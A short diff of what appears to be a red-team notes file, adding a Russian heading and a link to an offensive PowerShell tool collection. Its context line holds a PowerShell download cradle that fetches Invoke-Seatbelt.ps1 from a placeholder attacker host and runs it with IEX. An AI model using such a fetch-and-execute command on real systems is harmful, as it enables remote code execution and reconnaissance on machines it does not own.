@@ -586,3 +586,8 @@ $webClient.DownloadString('http://PWNIP:PWNPO/Invoke-Seatbelt.ps1') | IEX;
     https://www.youtube.com/watch?v=jgx1IU9IXVE&t=203s
 
     https://github.com/CBLabresearch/clematis?tab=readme-ov-file
+
+# Сборник Powershell script for windows
+
+https://github.com/S3cur3Th1sSh1t/PowerSharpPack
+
